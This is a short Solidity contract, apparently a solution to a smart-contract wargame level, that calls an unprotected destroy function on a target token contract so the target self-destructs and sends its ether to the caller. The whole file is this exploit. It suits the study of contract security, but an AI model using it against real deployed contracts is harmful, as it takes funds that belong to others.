// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IToken{
  function destroy(address payable _to) external;
}

contract RecoveryCrack{

    function crack(IToken _target) public{
        _target.destroy(msg.sender);
    }
}
